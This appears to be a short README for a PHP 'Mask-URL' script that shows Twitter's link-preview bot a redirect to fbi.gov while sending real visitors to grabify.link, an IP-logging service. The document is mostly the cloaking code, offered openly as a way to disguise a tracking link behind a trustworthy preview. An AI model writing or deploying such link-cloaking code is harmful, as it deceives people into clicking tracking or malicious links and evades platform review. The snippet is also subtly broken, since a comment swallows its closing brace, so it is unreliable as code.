# Mask-URL

With this PHP script you can mask the link content example: the link show's content of fbi.gov website but when you click you get into grabify.link
# Example
```php
<?php
if (strpos($_SERVER["HTTP_USER_AGENT"], "Twitterbot") !== false) {
 header("location: https://fbi.gov"); // fake url
} else { header("location: grabify.link");// real url } 
?>
```
